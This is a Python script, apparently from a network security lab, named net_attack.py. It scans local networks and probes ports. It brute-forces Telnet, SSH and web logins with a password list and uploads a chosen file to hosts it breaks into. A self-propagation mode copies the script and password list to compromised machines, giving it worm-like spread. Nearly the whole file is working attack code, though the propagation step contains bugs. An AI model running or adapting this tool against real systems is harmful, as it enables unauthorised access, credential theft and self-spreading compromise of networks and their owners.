#!/usr/bin/python3

import sys
from telnetlib import Telnet
from scapy.all import *
import time
from paramiko import SSHClient, AutoAddPolicy
import paramiko
import requests
import os
import socket



def help():
    """
    Function to print help information to the terminal.
    """

    print('\n'+'-'*50)
    print('\n\t\tNet Attack - Help\n')
    print('-'*50)
    print('\nScript to automatically discover weak usernames and passwords being used by services running on a host\n')
    print('\nRequired parameters:')
    print('-t   :   Filename for a file containing list of IP addresses, cannot be used with -P')
    print('-p   :   Ports to scan on the target host')
    print('-u   :   A username')
    print('-u   :   Filename for a file containing a list of passwords')
    print('\nOptional parameters:')
    print('-L   :   Local scan - Scan IPs on /24 LAN of all interfaces. Cannot be used with -t')
    print('-P   :   Self propagating mode')
    print('\nExample usage:\n\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt')
    print('\t./net_attack.py -t ip_list.txt -p 22 -u root -f passwords.txt')
    print()
    print('-'*50+'\n')
    

def get_arg(a):
    """
    Return arguement prefixed by argument 'a'
    Params:
    a:      dtype: STRING 
            Input arg
    Return:
    ret:    dtype: INT
            Return code (1 = Function returns successfuly | -1 = Function failed)
    res:    dtype: STRING
            Arguement prefixed by parameter 'a'

    """

    if a in sys.argv:
        i = sys.argv.index(a)
        try:
            ret = 1
            res = sys.argv[i+1]
        except:
            ret = -1
            res = None

    else:
        ret = -1
        res = None


    return ret, res


def read_ip_list(ip_file):
    """
    Read in file 'ip_file' and parse IPs 
    Params:
    ip_file:    dtype: STRING
                Filename
    Return:
    ret:        dtype: INT
                Return code (1 = Function returns successfuly)
    res:        dtype: LIST
                Parsed IPs
    """

    res = []
    try:
        with open(ip_file, 'r') as f:
            ips = f.read().splitlines()

        for i in ips:
            res.append(i)

        ret = 1

    except FileNotFoundError:
        ret = -1
        
    return ret, res


def is_reachable(ip):
    """
    Verify IP is reachable - Send scapy ICMP and if host responds return True
    Params:
    ip:     dtype: STRING
            Target IP 
    Return:
    res:    dtype: BOOLEAN
            True if IP is up
    """

    response = sr1(IP(dst=ip)/ICMP(), timeout=0.05, verbose=False)

    if response == None:
        #No response, do nothing
        return False
    else:
        #ICMP response recieved. 
        return True


def scan_port(ip, port):
    """
    Scan 'port' on 'ip' using SYN
    Params:
    ip:     dtype: STRING
            Target IP
    port:   dtype: STRING
            Target Port
    Return:
    res:    dtype: BOOLEAN
            True if port is open
    """

    ip_hdr = IP(dst=ip)
    tcp_hdr = TCP(dport=int(port), flags='S')
    pkt = ip_hdr/tcp_hdr

    resp, unans = sr(pkt, iface = 'h1-eth0', verbose=False)


    if resp[0][1][TCP].flags.S and resp[0][1][TCP].flags.A:
        # If SA flags are set, port is open
        print('{}: Port {} is OPEN'.format(ip, port))
        return True
    
    print('{}: Port {} is CLOSED'.format(ip, port))

    return False

def enc(s):
    return s.encode('ascii')

def bruteforce_telnet(ip, port, username, password_list_filename):
    """
    Attempt to brute force telnet login host at 'ip' on 'port' using credentials specified
    Params:
    ip:                     dtype: STRING
                            Target IP
    port:                   dtype: STRING
                            Target port
    username:               dtype: STRING
                            Username
    password_list_filename: dtype: STRING
                            File containing passwords to try
    Return:
    res:                    dtype: STRING
                            Successful logincredentials in the format username:password
    """
    
    res = ''

    with open(password_list_filename) as file:
        passwords = file.read().splitlines()

    try:
        for p in passwords:
            with Telnet(ip, int(port)) as tel:
                r = tel.read_until(enc("login:"), timeout=1)
                r = tel.write(enc(username + "\n"))
                r = tel.read_until(enc("Password:"), timeout=1)
                r = tel.write(enc(p + "\n"))
                r = tel.read_until(enc("Welcome to"), timeout=1).decode('ascii')
                if 'Welcome to' in r:
                    res = username + ':' + p
                    print('IP: {} => Telnet Credentials:> {}'.format(ip, res))
                    break

    except ConnectionRefusedError:
        pass

    return res
    
def bruteforce_ssh(ip, port, username, password_list_filename):
    """
    Attempt to brute force ssh login host at 'ip' on 'port' using credentials specified
    Params:
    ip:                     dtype: STRING
                            Target IP
    port:                   dtype: STRING
                            Target port
    username:               dtype: STRING
                            Username
    password_list_filename: dtype: STRING
                            File containing passwords to try
    Return:
    res:                    dtype: STRING
                            Successful logincredentials in the format username:password
    """

    res = ''

    with open(password_list_filename) as file:
        passwords = file.read().splitlines()

    for p in passwords:
        try:
            with SSHClient() as client:
                client.set_missing_host_key_policy(AutoAddPolicy())
                client.connect(ip, username=username, password=p)
            res = username + ':' + p
            print('IP: {} => SSH Credentials:> {}'.format(ip, res))
            break                                               # We have found credentials: Break and return

        except paramiko.ssh_exception.AuthenticationException:
            # Login Credentials did not work. Try next password
            pass

    return res


def bruteforce_web(ip, port, username, password_list_filename):
    """
    Attempt to brute force web login host at 'ip' on 'port' using credentials specified
    Params:
    ip:                     dtype: STRING
                            Target IP
    port:                   dtype: STRING
                            Target port
    username:               dtype: STRING
                            Username
    password_list_filename: dtype: STRING
                            File containing passwords to try
    Return:
    res:                    dtype: STRING
                            Successful logincredentials in the format username:password
    """

    res = ''

    with open(password_list_filename) as file:
        passwords = file.read().splitlines()

    # Detect Webpage
    web_page_online = False
    try:
        get_url = 'http://{}:{}/index.php'.format(ip, port)
        resp = requests.get(get_url, timeout= 1)
        if resp.status_code == 200:
            web_page_online = True
    except requests.exceptions.ConnectionError and requests.exceptions.ReadTimeout:
        pass


    post_url = 'http://{}:{}/login.php'.format(ip, port)

    if web_page_online:
        for p in passwords:
            data = {}
            data['username'] = username
            data['password'] = p
            resp = requests.get(get_url)
            resp = requests.post(post_url, data, timeout=1)
            if resp.status_code == 200:
                if 'Welcome' in resp.text:
                    res = username + ':' + p
                    print('IP: {} => Web Credentials:> {}'.format(ip, res))
                    break

    return res





def transfer_file(f, ip, credentials):
    """
    Transfer file 'f' to host 'ip' on 'port' using credentials provided
    Params:
    f:                      dtype: STRING
                            Path of deploy file
    ip:                     dtype: STRING
                            Target IP
    port:                   dtype: STRING
                            Target port
    credentials:            dtype: STRING
                            username:password
    Return:
    ret:                    dtype: INT
                            Return code (1 = Function returns successfuly)
    """
   
    ret = -1
    source_ip = '10.0.0.1'
    source_username = 'ubuntu'

    username, password = credentials.split(':')[0], credentials.split(':')[1]
    filename = f.split('/')[-1]
    with paramiko.SSHClient() as client:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, '22', username=username, password=password, timeout=4)
        sftp = client.open_sftp()
        print(sftp.put(f, filename))


    return ret


def get_target_ips():
    """
    Get list of all IPs on /24 lan of all interfaces

    Return:
    target_ips  dtype: LIST
                List of all target IPs
    """

    ret = 1
    ifaces = os.listdir('/sys/class/net/')

    try:
        ifaces.remove('lo')         #Remove loop back interface
    except:
        pass
 
    print('Scanning IPs on the following interfaces: ', ifaces)
    target_ips = []
    for nic in ifaces:
        iface_ip = get_if_addr(nic)             # Get IP address of interface
        split_ip = iface_ip.split('.')          # Split address into list of octets
    
        for i in range(256):
            new_ip = split_ip[0] + '.' + split_ip[1] + '.' +  split_ip[2] + '.' +  str(i) 
            if not new_ip == iface_ip:
                target_ips.append(new_ip)

    return target_ips


def self_propagation(ip, credentials, passwords, protocol):
    """
    Connect to host at 'ip' with 'credentials'. If script does not exist on host
    Transfer script and passwords file and execute script.
    Params:
    ip              dtype: STRING
                    Target IP address

    credentials:    dtype: STRING
                    username:password

    passwords:      dtype: STRING
                    passwords file name

    protocol:       dtyp:STRING
                    ssh or tel

    """

    username, password = credentials.split(':')[0], credentials.split(':')[1]

    script = os.path.basename(__file__)
    command = 'ls'            # Check if script is already present, if present return

    # Connect to server
    if protocol == 'ssh':

        with SSHClient() as client:
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password)
            stdin, stdout, stderr = client.exec_command(command)
            data = stdout.read().decode("ascii")
            if script in data:                          #If script is on server, skip
                print('Script already on {}'.format(ip))
                return
            
    elif protocol == 'tel':
        pass

    else:
        print('Invalid protocol: ', protocol)
        return


    # Transfer script
    transfer_file(script, ip, credentials)

    # Transfer passwords
    transfer_file(passwords, ip, credentials)

    # Run script with -L and -P options
    run_command = './net_attack.py -L -p 22,23 -u root -f passwords.txt -P'

    if protocol == 'ssh':

        with SSHClient() as client:
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password)
            stdin, stdout, stderr = client.exec_command(command)
            data = stdout.read().decode("ascii")
            print(data)
            

def main():


    local_scan = False
    self_propagate = False

    # Parse IP List Filename
    ret, arg = get_arg('-t')
    if ret == -1:
        if '-L' in sys.argv:
            local_scan = True
    else:
        target_ips_file = arg

    if '-P' in sys.argv:
        self_propagate = True

    # Parse Ports
    ret, arg = get_arg('-p')
    if ret == -1:
        help()
        return
    else:
        ports = arg

    # Parse Username
    ret, arg = get_arg('-u')
    if ret == -1:
        help()
        return
    else:
        u_name = arg


    # Parse Password List Filename
    ret, arg = get_arg('-f')
    if ret == -1:
        help()
        return
    else:
        password_list_file = arg
    

    # Parse Deploy File
    ret, arg = get_arg('-d')
    if ret == -1:
        deploy_file = None
        pass
    else:
        deploy_file = arg

    # Read IP addresses
    if local_scan:
        target_ips = get_target_ips()
    else:
        ret, target_ips = read_ip_list(target_ips_file)

    # Verify Connectivity
    ips_online = []
    print('IPs Online:')
    for i in target_ips:  
        if is_reachable(i):
            ips_online.append(i)
            print(i)

    # Port Scan
    port_list = ports.split(',')
    open_ports = {}                 # For each online IP, save list of ports that are open
    for i in ips_online:
        open_ports[i] = []          
        for p in port_list:
            if scan_port(i, p):
                open_ports[i].append(p)
    
    # Bruteforce Telnet
    telent_credentials = {}         # For each IP retain login credentials
    telnet_port = '23'
    for ip in ips_online:
        if telnet_port in open_ports[ip]:
            telent_credentials[ip] = bruteforce_telnet(ip, telnet_port, u_name, password_list_file)

    # Bruteforce SSH
    ssh_credentials = {} 
    ssh_port = '22'        
    for ip in ips_online:
        if ssh_port in open_ports[ip]:
            ssh_credentials[ip] = bruteforce_ssh(ip, ssh_port, u_name, password_list_file)


    # # Bruteforce Web Login
    web_credentials = {}
    web_ports = ['80', '8080', '8888']
    for ip in ips_online:
        for p in web_ports:
            if p in open_ports[ip]:
                web_credentials[ip] = bruteforce_web(ip, p, u_name, password_list_file)
                

    # Deploying Files
    if not deploy_file == None:
        if os.path.exists(deploy_file):
            deploy_file = os.path.dirname(os.path.abspath(deploy_file)) + '/' + deploy_file
            for ip in ips_online:
                if ip in telent_credentials.keys():
                    transfer_file(deploy_file, ip, telent_credentials[ip])
                elif ip in ssh_credentials.keys():
                    transfer_file(deploy_file, ip, ssh_credentials[ip])
        else:
            print('Deployment file does not exist')


    # Self-Propagation
    if self_propagate == True:
        for ip in ips_online:
            if ip in telent_credentials.keys():
                self_propagation(ip, telent_credentials[ip], password_list_file, 'tel')
            elif ip in ssh_credentials.keys():
                self_propagation(ip, ssh_credentials[ip], password_list_file, 'ssh')



if __name__ == '__main__':
    main()

